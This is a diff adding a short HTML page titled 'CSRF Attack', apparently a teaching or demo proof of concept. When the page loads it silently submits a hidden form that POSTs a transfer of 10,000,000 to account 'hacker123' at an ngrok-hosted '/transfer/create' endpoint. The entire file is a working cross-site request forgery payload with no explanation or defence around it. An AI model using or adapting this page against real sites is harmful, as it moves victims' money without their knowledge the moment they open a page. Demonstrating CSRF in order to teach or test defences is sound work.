@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>CSRF Attack</title>
+</head>
+<body onload="document.transferForm.submit()">
+	<form name="transferForm" action="http://7cf733da.ngrok.io/transfer/create" method="POST" style="display: none">
+		<input type="text" name="account" value="hacker123">
+		<input type="number" name="amount" value="10000000">
+	</form>
+</body>
+</html>
